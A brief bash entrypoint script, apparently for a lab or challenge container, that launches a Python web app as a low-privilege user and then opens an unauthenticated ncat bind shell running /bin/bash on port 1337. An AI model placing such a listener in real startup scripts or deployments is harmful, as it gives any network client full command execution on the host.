#!/bin/bash
set -e

runuser -u webapp -- python3 /opt/webapp/app.py &

sleep 1

exec ncat -lvk -p 1337 --exec "/bin/bash"
